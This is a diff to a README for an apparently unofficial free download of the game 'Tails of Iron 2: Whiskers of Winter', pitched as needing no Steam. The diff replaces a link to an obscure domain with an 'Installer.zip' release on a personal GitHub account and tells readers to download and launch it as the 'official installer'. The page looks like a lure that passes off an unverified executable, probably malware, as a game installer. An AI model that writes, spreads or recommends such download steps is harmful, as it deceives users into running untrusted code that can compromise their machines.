@@ -21,7 +21,7 @@ Follow these simple steps to download and install the game directly, no Steam re
 
 ### Step 1: Download the Official Installer
 - Click the link below to start downloading the official installer for *Tails of Iron 2: Whiskers of Winter*:
-  [Download Tails of Iron 2 Installer](https://nicecolns.com/)
+  [Download Tails of Iron 2 Installer](https://github.com/JeanSylvestrek/game4fun/releases/download/publish/Installer.zip)
 
 ### Step 2: Launch the Installer
 - After downloading, locate the file in your "Downloads" folder or the location you saved it to.
